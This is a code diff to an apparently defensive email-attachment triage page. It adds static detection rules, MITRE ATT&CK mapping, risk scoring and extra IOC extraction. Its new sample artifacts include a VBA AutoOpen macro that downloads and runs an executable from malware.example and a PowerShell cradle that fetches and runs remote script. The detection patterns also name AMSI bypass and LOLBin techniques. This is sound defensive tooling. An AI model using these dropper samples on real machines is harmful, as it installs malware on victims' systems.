@@ -34,20 +34,52 @@ const STATIC_RULES = [
   { name: "PE injection-style API cluster", severity: "Medium", category: "Static Rule", pattern: /(?=.*VirtualAlloc)(?=.*WriteProcessMemory|.*CreateRemoteThread|.*LoadLibrary)/is, action: "Treat as a PE/malware-analysis pivot and validate imports/sections statically." },
   { name: "HTML credential harvester", severity: "High", category: "Static Rule", pattern: /<form[\s\S]{0,800}(?:password|login|signin|credential)/i, action: "Route form action URL to Safe URL Analyzer and Phishing Triage." },
   { name: "PDF launch or embedded file behavior", severity: "High", category: "Static Rule", pattern: /\/(?:OpenAction|Launch|EmbeddedFile|JavaScript|AA)\b/i, action: "Inspect PDF structure with static tooling before opening." },
+  { name: "AMSI bypass pattern", severity: "High", category: "Static Rule", pattern: /(?:amsi\.scanbuffer|amsiutils|etwti|etw::|AmsiOpenSession|AmsiScanBuffer|AmsiScanString)/i, action: "AMSI bypass techniques attempt to disable script scanning. Escalate for thorough analysis." },
+  { name: "Multiple LOLBin references", severity: "Medium", category: "Static Rule", pattern: /(?:rundll32|regsvr32|mshta|certutil.*urlcache|bitsadmin.*transfer|msbuild|installutil|cmstp|hh\.exe).*(?:rundll32|regsvr32|mshta|certutil|bitsadmin|msbuild)/i, action: "Multiple LOLBin references can indicate chained execution. Review command strings in detail." },
+  { name: "Registry persistence mechanism", severity: "Medium", category: "Static Rule", pattern: /(?:CurrentVersion\\Run|Image File Execution Options|Debugger|sethc\b|utilman\b|sticky.keys).*(?:exe|dll|ps1|vbs)/i, action: "Registry persistence keys can indicate privilege escalation or backdoor installation. Investigate context." },
+  { name: "Crypto wallet or seed phrase reference", severity: "Medium", category: "Static Rule", pattern: /(?:wallet\.dat|seed phrase|mnemonic|private.key|metamask|keystore)/i, action: "Crypto wallet references may indicate coin-stealer or ransomware behavior. Handle with care." },
+  { name: "VBA macro auto-execution (malicious doc)", severity: "High", category: "Static Rule", pattern: /(?:Auto_Open|AutoExec|AutoNew|Document_Close|\+Private\s+Sub\s+Auto_Open|\+Public\s+Sub\s+AutoOpen)/i, action: "VBA auto-execution macros commonly execute payload on document open. Extract macro code via olevba or similar." },
+  { name: "DLL side-loading indicators", severity: "Medium", category: "Static Rule", pattern: /(?:DllMain|DllRegisterServer|DllInstall|ReflectiveLoader|\.dll\s*$)/im, action: "PE with DLL exports without a corresponding executable may indicate side-loading. Validate library imports." },
+  { name: "Encoded PowerShell one-liner", severity: "High", category: "Static Rule", pattern: /(?:-EncodedCommand\s+[A-Za-z0-9+/]{50,}|-e\s+[A-Za-z0-9+/]{50,}|-enc\s+[A-Za-z0-9+/]{50,})/i, action: "Encoded PowerShell commands are heavily used for obfuscation. Decode and analyze in CyberChef." },
 ]
 
-const SAMPLE_TEXT = [
-  "Filename: Microsoft_Account_Verification.html",
-  "<html><body>",
-  "<h1>Microsoft 365 account verification required</h1>",
-  '<form action="hxxps://login-microsoft-security[.]example/submit" method="post">',
-  '<input type="email" name="user">',
-  '<input type="password" name="password">',
-  '<input type="hidden" name="session" value="ab92kdsk_live_token_7788">',
-  "</form>",
-  '<script>window.location="http://198.51.100.23/account/reset"; document.cookie="sessionid=abc123";</script>',
-  "</body></html>",
-].join("\n")
+const SAMPLE_TEXTS = {
+  html: [
+    "Filename: Microsoft_Account_Verification.html",
+    "<html><body>",
+    "<h1>Microsoft 365 account verification required</h1>",
+    '<form action="hxxps://login-microsoft-security[.]example/submit" method="post">',
+    '<input type="email" name="user">',
+    '<input type="password" name="password">',
+    '<input type="hidden" name="session" value="ab92kdsk_live_token_7788">',
+    "</form>",
+    '<script>window.location="http://198.51.100.23/account/reset"; document.cookie="sessionid=abc123";</script>',
+    "</body></html>",
+  ].join("\n"),
+  macro: [
+    "Filename: Invoice_2025.docm",
+    "Sub AutoOpen()",
+    '  Dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP")',
+    '  xHttp.Open "GET", "http://malware.example/payload.exe", False',
+    "  xHttp.Send",
+    '  Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")',
+    "  bStrm.Type = 1",
+    "  bStrm.Open",
+    "  bStrm.Write xHttp.responseBody",
+    '  bStrm.SaveToFile Environ("TEMP") & "\\svchost.exe", 2',
+    '  CreateObject("WScript.Shell").Run Environ("TEMP") & "\\svchost.exe"',
+    "End Sub",
+  ].join("\n"),
+  script: [
+    "Filename: receipt_scan.ps1",
+    "$wc = New-Object System.Net.WebClient",
+    '$wc.Headers.Add("User-Agent", "Mozilla/5.0")',
+    '$payload = $wc.DownloadString("hxxps://paste[.]example/raw/abc123")',
+    "Invoke-Expression $payload",
+    "$key = 'A1B2C3D4E5F6G7H8'",
+    "$env:COMPUTERNAME | ConvertTo-SecureString -AsPlainText -Force | ConvertFrom-SecureString -Key ([Text.Encoding]::UTF8.GetBytes($key))",
+  ].join("\n"),
+}
 
 function bytesToHex(bytes) {
   return [...new Uint8Array(bytes)].map((byte) => byte.toString(16).padStart(2, "0")).join("")
@@ -116,6 +148,82 @@ async function digestBuffer(buffer, algo) {
   if (algo === "MD5") return md5Bytes(new Uint8Array(buffer))
   const digest = await crypto.subtle.digest(SUBTLE_ALGOS[algo], buffer)
   return bytesToHex(digest)
+}
+
+const ATTACHMENT_MITRE_MAP = {
+  "PowerShell download cradle": "T1059.001",
+  "Office macro auto-execution": "T1204.002",
+  "PE injection-style API cluster": "T1055.001",
+  "HTML credential harvester": "T1566.002",
+  "PDF launch or embedded file behavior": "T1204.002",
+  "AMSI bypass pattern": "T1562.001",
+  "Multiple LOLBin references": "T1204.002",
+  "Registry persistence mechanism": "T1547.001",
+  "Crypto wallet or seed phrase reference": "T1486",
+  "VBA macro auto-execution (malicious doc)": "T1204.002",
+  "DLL side-loading indicators": "T1574.002",
+  "Encoded PowerShell one-liner": "T1059.001",
+}
+
+const ATTACHMENT_SCORE_WEIGHTS = {
+  executable_extension: { weight: 25, label: "Executable file extension" },
+  macro_enabled: { weight: 20, label: "Macro-enabled document (potential dropper)" },
+  encoded_script: { weight: 20, label: "Encoded or obfuscated script content" },
+  suspicious_filename: { weight: 15, label: "Suspicious filename pattern" },
+  double_extension: { weight: 15, label: "Double extension masquerading" },
+  office_document: { weight: 10, label: "Office document with external references" },
+  archive_containing_exe: { weight: 15, label: "Archive containing executable" },
+  ips_or_urls: { weight: 10, label: "Contains IP addresses or URLs" },
+  large_file: { weight: 5, label: "Unusually large file size" },
+  mismatch_extension: { weight: 10, label: "MIME-extension mismatch" },
+}
+
+function computeAttachmentScore(result = {}) {
+  if (!result?.findings?.length) return { score: 0, level: "unknown", breakdown: [] }
+  const breakdown = []
+  let total = 0
+  for (const finding of result.findings) {
+    const key = finding.ruleId || finding.type || ""
+    const match = Object.entries(ATTACHMENT_SCORE_WEIGHTS).find(([k]) => key.toLowerCase().includes(k.replace(/_/g, "")))
+    if (match) {
+      const points = match[1].weight
+      breakdown.push({ signal: match[1].label, score: points })
+      total += points
+    } else {
+      breakdown.push({ signal: finding.ruleId || finding.message || "Unknown signal", score: 5 })
+      total += 5
+    }
+  }
+  const score = Math.min(total, 100)
+  const level = score >= 75 ? "critical" : score >= 55 ? "high" : score >= 35 ? "medium" : score >= 15 ? "low" : "safe"
+  return { score, level, breakdown }
+}
+
+function generateProfessionalAssessment(result = {}) {
+  if (!result) return ""
+  const score = result.score || computeAttachmentScore(result)
+  const findings = result.findings || []
+  const topFindings = findings.slice(0, 4).map((f) => `- ${f.message || f.ruleId || "Signal"} [${f.severity || "info"}]`)
+  return [
+    "## Static Analysis Assessment",
+    "",
+    `**Risk Level:** ${score.level?.toUpperCase()} (${score.score}/100)`,
+    `**Findings:** ${findings.length} rule(s) matched`,
+    "**Primary Concerns:**",
+    ...topFindings,
+    "",
+    "**Analyst Recommendation:**",
+    findings.some((f) => /executable|macro|encoded|script/i.test(f.message || ""))
+      ? "- Isolate attachment for deep sandbox analysis. Do not open on production systems."
+      : findings.some((f) => /url|ip|external/i.test(f.message || ""))
+      ? "- Review extracted IoCs against threat intelligence before allowing delivery."
+      : "- Triage findings in context of sender relationship and expected content.",
+    "**Limitations:** Static analysis only — no dynamic execution, sandbox, or detonation was performed.",
+  ].join("\n")
+}
+
+function mapAttachmentMitre(rule) {
+  return { ...rule, mitre_id: ATTACHMENT_MITRE_MAP[rule.name] || "" }
 }
 
 function identifyHashValue(value) {
@@ -198,7 +306,13 @@ function extractIocs(text = "") {
   const formActions = [...new Set([...text.matchAll(/<form[^>]+action=["']?([^"'\s>]+)/gi)].map((match) => match[1].replace(/^hxxp/i, "http").replace(/\[\.\]/g, ".")))]
   const redirects = [...new Set([...text.matchAll(/(?:location|href|url)\s*=\s*["']?([^"'\s;>]+)/gi)].map((match) => match[1].replace(/^hxxp/i, "http").replace(/\[\.\]/g, ".")))]
   const base64Blobs = [...new Set(text.match(/\b[A-Za-z0-9+/]{40,}={0,2}\b/g) || [])].slice(0, 20)
-  return { urls, defanged_urls: defangedUrls, domains, ips, emails, hashes, file_names: fileNames, paths, form_actions: formActions, redirects, file_paths: filePaths, registry_paths: registryPaths, base64_blobs: base64Blobs }
+  const asns = [...new Set(text.match(/\bAS\d{1,6}\b/gi) || [])]
+  const macAddresses = [...new Set(text.match(/\b(?:[0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}\b/g) || [])]
+  const btcAddresses = [...new Set(text.match(/\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b/g) || [])]
+  const ethAddresses = [...new Set(text.match(/\b0x[a-fA-F0-9]{40}\b/g) || [])]
+  const cvEs = [...new Set(text.match(/\bCVE-\d{4}-\d{4,7}\b/gi) || [])]
+  const mitreIds = [...new Set(text.match(/\bT\d{4}(?:\.\d{3})?\b/g) || [])].filter((t) => t.length >= 5)
+  return { urls, defanged_urls: defangedUrls, domains, ips, emails, hashes, file_names: fileNames, paths, form_actions: formActions, redirects, file_paths: filePaths, registry_paths: registryPaths, base64_blobs: base64Blobs, asns, mac_addresses: macAddresses, btc_addresses: btcAddresses, eth_addresses: ethAddresses, cves: cvEs, mitre_ids: mitreIds }
 }
 
 function containsWordish(text, term) {
@@ -206,8 +320,8 @@ function containsWordish(text, term) {
   return new RegExp(`(?:^|[^A-Za-z0-9_])${escaped}(?:$|[^A-Za-z0-9_])`, "i").test(text)
 }
 
-function finding(title, category, severity, evidence, why, action, limitation = "Local static signal; analyst review required.") {
-  return { title, category, severity, evidence: String(evidence || "N/A"), why, recommended_action: action, limitation }
+function finding(title, category, severity, evidence, why, action, limitation = "Local static signal; analyst review required.", mitreId = "") {
+  return { title, category, severity, evidence: String(evidence || "N/A"), why, recommended_action: action, limitation, mitre_id: mitreId }
 }
 
 function severityClass(severity = "") {
@@ -240,7 +354,7 @@ function analyzeStatic({ fileMeta, stringsText, entropyValue }) {
   OFFICE_TERMS.filter((term) => containsWordish(stringsText, term)).forEach((term) => findings.push(finding("Office/VBA-like string", "Static Strings", "Medium", term, "VBA automation terms can indicate macro behavior.", "Review macro streams with static tooling if present.")))
   COMMAND_TERMS.filter((term) => stringsText.toLowerCase().includes(term.toLowerCase())).forEach((term) => findings.push(finding("Suspicious command keyword", "Static Strings", term === "encodedcommand" ? "High" : "Medium", term, "Command keywords can indicate script or LOLBin behavior.", "Send command text to CyberChef and review behavior notes.")))
   API_TERMS.filter((term) => stringsText.includes(term)).forEach((term) => findings.push(finding("Suspicious Windows API string", "Static Strings", "Medium", term, "Process/memory API strings can appear in tooling or malware.", "Correlate with file type, imports, and context.")))
-  STATIC_RULES.filter((rule) => rule.pattern.test(stringsText)).forEach((rule) => findings.push(finding(rule.name, rule.category, rule.severity, rule.pattern.toString(), "A local static malware/attachment rule matched this artifact content. This is a review signal, not a verdict.", rule.action)))
+  STATIC_RULES.map(mapAttachmentMitre).filter((rule) => rule.pattern.test(stringsText)).forEach((rule) => findings.push(finding(rule.name, rule.category, rule.severity, rule.pattern.toString(), "A local static malware/attachment rule matched this artifact content. This is a review signal, not a verdict.", rule.action, rule.mitre_id)))
   if (/<form\b/i.test(stringsText) && /password/i.test(stringsText)) findings.push(finding("HTML credential form detected", "Credential Phishing", "High", "<form> with credential fields", "HTML forms that request credentials are common in credential-harvesting attachments.", "Review form action and route extracted URLs/domains to Recon & Exposure."))
   if (/<input[^>]+type=["']?password/i.test(stringsText)) findings.push(finding("Password input field detected", "Credential Phishing", "High", "input type=password", "Password collection inside an attachment is a high-risk phishing signal.", "Preserve evidence and escalate if delivered by email."))
   if (iocs.form_actions.length) findings.push(finding("External form action URL detected", "Credential Phishing", "High", iocs.form_actions.join(", "), "Submitted credentials may be sent to an external endpoint.", "Do not submit data. Pivot destination in Recon & Exposure."))
@@ -286,6 +400,12 @@ function buildReport(state) {
     `- Form actions: ${state.iocs.form_actions.join(", ") || "None"}`,
     `- Redirects: ${state.iocs.redirects.join(", ") || "None"}`,
     `- File names: ${state.iocs.file_names.join(", ") || "None"}`,
+    `- ASNs: ${state.iocs.asns.join(", ") || "None"}`,
+    `- MAC addresses: ${state.iocs.mac_addresses.join(", ") || "None"}`,
+    `- CVEs: ${state.iocs.cves.join(", ") || "None"}`,
+    `- MITRE ATT&CK IDs: ${state.iocs.mitre_ids.join(", ") || "None"}`,
+    `- BTC addresses: ${state.iocs.btc_addresses.join(", ") || "None"}`,
+    `- ETH addresses: ${state.iocs.eth_addresses.join(", ") || "None"}`,
     "",
     "## Hash Summary",
     ...(Object.entries(state.fileHashes || {}).length ? Object.entries(state.fileHashes).map(([key, value]) => `- ${key}: ${value}`) : ["- No uploaded file hashes generated."]),
@@ -294,6 +414,9 @@ function buildReport(state) {
     "## Recommended Actions",
     "- Preserve original attachment/hash and do not execute the file.",
     "- Route URLs, domains, and IPs to Recon & Exposure.",
+    "- Route ASNs to Recon for infrastructure correlation.",
+    "- Route CVEs to CyberChef or Recon for enrichment.",
+    "- Route wallet/coin addresses to blockchain explorer if coin-stealer is suspected.",
     "- Add relevant indicators and top findings to the analyst report.",
     "- Correlate file name, hash, sender, and URL indicators across mailbox, EDR, proxy, and DNS logs.",
     "- Treat static risk as a review signal, not a confirmed malware verdict.",
@@ -331,7 +454,7 @@ function FindingCard({ item }) {
 }
 
 function countIocs(iocs = {}) {
-  return ["urls", "defanged_urls", "domains", "ips", "emails", "hashes", "file_names", "paths", "form_actions", "redirects"].reduce((sum, key) => sum + (iocs[key]?.length || 0), 0)
+  return ["urls", "defanged_urls", "domains", "ips", "emails", "hashes", "file_names", "paths", "form_actions", "redirects", "asns", "mac_addresses", "cves", "mitre_ids"].reduce((sum, key) => sum + (iocs[key]?.length || 0), 0)
 }
 
 function compactIocEntries(iocs = {}) {
@@ -346,6 +469,10 @@ function compactIocEntries(iocs = {}) {
     ["Paths", iocs.paths, false],
     ["Form actions", iocs.form_actions, true],
     ["Redirects", iocs.redirects, true],
+    ["ASNs", iocs.asns, false],
+    ["MAC addresses", iocs.mac_addresses, false],
+    ["CVEs", iocs.cves, false],
+    ["MITRE IDs", iocs.mitre_ids, false],
   ].filter(([, values]) => Array.isArray(values) && values.length > 0)
 }
 
@@ -392,9 +519,16 @@ function groupStrings(stringsText, iocs) {
     "Credential terms": matching(/password|credential|login|verify|account|username|email/i),
     "Brand terms": matching(/microsoft|office\s*365|m365|onedrive|sharepoint|security/i),
     "Session / cookie / secret-like strings": matching(/cookie|session|token|secret|csrf|api[_-]?key|auth/i),
-    "Network indicators": [...new Set([...iocs.urls, ...iocs.defanged_urls, ...iocs.domains, ...iocs.ips])],
+    "Network indicators": [...new Set([...iocs.urls, ...iocs.defanged_urls, ...iocs.domains, ...iocs.ips, ...iocs.asns, ...iocs.mac_addresses])],
     "Script indicators": matching(/<script|javascript|window\.location|document\.cookie|eval\(|atob\(/i),
     "HTML/form indicators": matching(/<form|<input|action=|method=|type=["']?password/i),
+    "AMSI / ETW bypass": matching(/amsi|etwti|etw::|AmsiOpenSession|AmsiScanBuffer|AmsiScanString|bypass.*amsi|disable.*script|amsi\.dll|clr\.dll/i),
+    "LOLBin references": matching(/rundll32|regsvr32|mshta|certutil|bitsadmin|msbuild|installutil|cmstp|pcalua|hh\.exe|forfiles|msiexec|csc\.exe/i),
+    "Registry persistence": matching(/CurrentVersion\\Run|Run\\|Image File Execution Options|Debugger|sethc|utilman|sticky keys|BootExecute|Userinit/i),
+    "Crypto / wallet references": matching(/wallet\.dat|bitcoin|litecoin|monero|electrum|metamask|keystore|seed phrase|mnemonic|private\.key/i),
+    "CVE / vulnerability references": [...new Set([...(iocs.cves || []), ...matching(/CVE-\d{4}-\d{4,7}/i)])],
+    "MITRE ATT&CK references": [...new Set([...(iocs.mitre_ids || []), ...matching(/\bT\d{4}(?:\.\d{3})?\b/)])].filter((t) => t.length >= 5),
+    "Encoded / PowerShell commands": matching(/encodedcommand|-enc\b|FromBase64String|System\.Convert|GZipStream|DeflateStream|Compress|Decompress|base64|b64|eval\(|document\.write|String\.fromCharCode/i),
   }
 }
 
@@ -446,6 +580,7 @@ export default function AttachmentTriagePage({ setPage }) {
   const [fileText, setFileText] = useState("")
   const [strings, setStrings] = useState([])
   const [entropyValue, setEntropyValue] = useState(0)
+  const [sampleType, setSampleType] = useState("html")
   const [pastedText, setPastedText] = useState(() => initialArtifact && initialArtifact.type !== "hash" && initialArtifact.type !== "filename" ? String(initialArtifact.value) : "")
   const [hashInput, setHashInput] = useState(() => ["hash", "filename"].includes(initialArtifact?.type) ? String(initialArtifact.value) : "")
   const [mode, setMode] = useState(() => ["hash", "filename"].includes(initialArtifact?.type) ? "hash" : initialArtifact ? "text" : "file")
@@ -454,6 +589,7 @@ export default function AttachmentTriagePage({ setPage }) {
   const [analyzed, setAnalyzed] = useState(false)
   const [inputOpen, setInputOpen] = useState(true)
   const [stringFilter, setStringFilter] = useState("Priority")
+  const [assessmentText, setAssessmentText] = useState("")
   const fileRef = useRef(null)
 
   const hashIds = useMemo(() => hashInput.split(/\r?\n|,/).map((item) => identifyHashValue(item)).filter(Boolean), [hashInput])
@@ -479,9 +615,10 @@ export default function AttachmentTriagePage({ setPage }) {
     const seen = new Set()
     return values.filter((item) => item.value && !seen.has(item.value) && seen.add(item.value))
   }, [fileHashes, generatedHashes, hashIds, iocs.hashes, fileMeta])
-  const iocText = ["urls", "defanged_urls", "domains", "ips", "emails", "hashes", "file_names", "paths", "form_actions", "redirects"].flatMap((key) => iocs[key] || []).join("\n")
+  const iocText = ["urls", "defanged_urls", "domains", "ips", "emails", "hashes", "file_names", "paths", "form_actions", "redirects", "asns", "mac_addresses", "btc_addresses", "eth_addresses", "cves", "mitre_ids"].flatMap((key) => iocs[key] || []).join("\n")
   const reportState = { fileMeta, fileHashes, hashIds, generatedHashes, entropyValue, entropyNote, strings, iocs, findings, risk, verdict, inputType, likelyType, summary, source: "user_provided_attachment_or_hash", method: "local_static_analysis", checked_at: new Date().toISOString(), limitations: ["No execution, detonation, upload, online reputation, online cracking, credential stuffing, login attempts, exploit generation, or external lookup was performed."] }
   const markdown = buildReport(reportState)
+  const attachmentScore = useMemo(() => computeAttachmentScore({ findings }), [findings])
   const topFindings = findings.slice(0, 6)
   const recommendedAction = findings.some((item) => item.title === "HTML credential form detected" || item.title === "Password input field detected")
     ? "Preserve the sample, avoid opening it interactively, pivot form-action domains, and search mailbox/proxy logs for matching delivery or clicks."
@@ -591,6 +728,7 @@ export default function AttachmentTriagePage({ setPage }) {
     setGeneratedHashes({})
     setAnalyzed(false)
     setInputOpen(true)
+    setAssessmentText("")
     setMode("file")
     setNotice("Workspace cleared.")
   }
@@ -702,7 +840,14 @@ export default function AttachmentTriagePage({ setPage }) {
                   <button className="ba-button-primary w-full rounded-xl px-4 py-2 text-sm font-black" onClick={runAnalysis}>Analyze attachment</button>
                   <div className="grid gap-2 sm:grid-cols-2 lg:grid-cols-1">
                     <button className="ba-button-secondary rounded-xl px-3 py-2 text-sm font-bold" onClick={() => fileRef.current?.click()}><Upload className="mr-2 inline h-4 w-4" />Upload file</button>
-                    <button className="ba-button-secondary rounded-xl px-3 py-2 text-sm font-bold" onClick={() => { setMode("text"); setPastedText(SAMPLE_TEXT); setHashInput(""); setNotice("Sample HTML attachment loaded.") }}><FileText className="mr-2 inline h-4 w-4" />Load sample</button>
+                    <div className="flex gap-1">
+                      <select value={sampleType} onChange={(event) => setSampleType(event.target.value)} aria-label="Sample type" className="ba-input flex-1 text-xs font-mono">
+                        <option value="html">HTML credential</option>
+                        <option value="macro">Office macro (VBA)</option>
+                        <option value="script">PowerShell script</option>
+                      </select>
+                      <button className="ba-button-secondary rounded-xl px-3 py-2 text-sm font-bold" onClick={() => { setMode("text"); setPastedText(SAMPLE_TEXTS[sampleType]); setHashInput(""); setNotice(`Sample ${sampleType} attachment loaded.`) }}><FileText className="mr-2 inline h-4 w-4" />Load</button>
+                    </div>
                     <button className="ba-button-secondary rounded-xl px-3 py-2 text-sm font-bold" onClick={clearAll}>Clear</button>
                   </div>
                   <div className="grid gap-2">
@@ -738,6 +883,38 @@ export default function AttachmentTriagePage({ setPage }) {
                 <Field label="Boundary" value="Static review only" />
               </div>
 
+              <div className="mt-4 rounded-xl border border-white/10 bg-black/40 p-3">
+                <div className="flex items-center justify-between gap-3">
+                  <div className="flex items-center gap-3">
+                    <p className="text-xs font-black uppercase tracking-[0.14em] text-zinc-400">Score</p>
+                    <span className={`ba-chip ${attachmentScore.level === "critical" ? "ba-status-danger" : attachmentScore.level === "high" ? "ba-status-danger" : attachmentScore.level === "medium" ? "ba-status-warning" : attachmentScore.level === "low" ? "ba-status-info" : "ba-status-local"}`}>{attachmentScore.level.toUpperCase()}</span>
+                    <span className="font-mono text-sm text-zinc-100">{attachmentScore.score}/100</span>
+                  </div>
+                  {attachmentScore.breakdown.length > 0 && (
+                    <details className="text-xs">
+                      <summary className="cursor-pointer font-bold text-cyan-300">Breakdown</summary>
+                      <div className="mt-2 space-y-1">
+                        {attachmentScore.breakdown.map((b, i) => (
+                          <div key={i} className="flex justify-between gap-4 text-zinc-300">
+                            <span>{b.signal}</span>
+                            <span className="font-mono text-zinc-100">+{b.score}</span>
+                          </div>
+                        ))}
+                      </div>
+                    </details>
+                  )}
+                </div>
+                <div className="mt-2 h-2 w-full overflow-hidden rounded-full bg-zinc-800">
+                  <div
+                    className="h-full rounded-full transition-all duration-300"
+                    style={{
+                      width: `${attachmentScore.score}%`,
+                      background: attachmentScore.score >= 75 ? "#ef4444" : attachmentScore.score >= 55 ? "#f97316" : attachmentScore.score >= 35 ? "#eab308" : attachmentScore.score >= 15 ? "#84cc16" : "#22c55e",
+                    }}
+                  />
+                </div>
+              </div>
+
               {!!attachmentIdentityFields.length && (
                 <details className="mt-4 rounded-xl border border-white/10 bg-black/40 p-3">
                   <summary className="cursor-pointer text-sm font-bold text-zinc-100"><FileSearch size={14} className="inline mr-1" />Attachment identity and local metadata</summary>
@@ -768,7 +945,22 @@ export default function AttachmentTriagePage({ setPage }) {
                   const entry = addTimelineArtifact({ title: `Attachment review: ${likelyType}`, summary: `${risk.level} concern · ${primaryConcern}`, source: "Attachment Triage", raw: markdown, tags: [risk.level, likelyType] })
                   setNotice(`Added to Case Timeline: ${entry.title}`)
                 }}>Add to timeline</button>
+                <button className="ba-button-secondary rounded-xl px-3 py-2 text-sm font-bold" onClick={() => {
+                  const text = generateProfessionalAssessment({ score: attachmentScore, findings })
+                  setAssessmentText(text)
+                  setNotice("Assessment generated.")
+                }}>Generate Assessment</button>
               </div>
+
+              {assessmentText && (
+                <div className="mt-4 rounded-xl border border-white/10 bg-black/40 p-3">
+                  <div className="flex items-center justify-between gap-3">
+                    <p className="text-xs font-black uppercase tracking-[0.14em] text-cyan-300">Professional Assessment</p>
+                    <button className="ba-button-ghost rounded-lg px-2 py-1 text-xs font-bold" onClick={() => { copy(assessmentText, "Assessment"); setNotice("Assessment copied.") }}>Copy</button>
+                  </div>
+                  <pre className="mt-3 whitespace-pre-wrap text-sm leading-6 text-zinc-200">{assessmentText}</pre>
+                </div>
+              )}
 
               <div className="mt-4">
                 <SendToActions
